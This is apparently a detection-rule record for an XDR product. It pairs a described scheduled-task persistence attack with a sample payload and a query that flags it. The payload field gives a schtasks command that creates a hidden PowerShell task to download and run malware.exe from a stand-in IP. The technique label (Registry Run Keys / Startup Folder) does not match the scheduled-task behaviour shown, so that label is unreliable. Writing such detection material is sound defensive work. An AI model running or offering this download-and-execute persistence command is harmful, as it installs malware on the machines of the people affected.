identity.description: An attacker creates a scheduled task using schtasks.exe to establish persistence. Cortex detects this behavior as an uncommon local scheduled task creation. The attack involves creating a task that executes a malicious payload from a remote location.

techniques.name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

payload.code: schtasks /create /sc daily /tn "UpdateService" /tr "powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri http://192.0.2.50/malware.exe -OutFile C:\\temp\\malware.exe; C:\\temp\\malware.exe\""

biocs.name: Uncommon Local Scheduled Task Creation
biocs.description: Detection of a scheduled task created locally with schtasks.exe that is not commonly seen in the environment
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'schtasks.exe'
| filter action_command_line contains '/create'
| filter action_command_line contains '/tn'
| filter action_command_line contains '/tr'
| filter action_command_line contains 'powershell.exe'
| filter action_command_line contains 'Invoke-WebRequest'
| filter action_command_line contains '192.0.2.50'
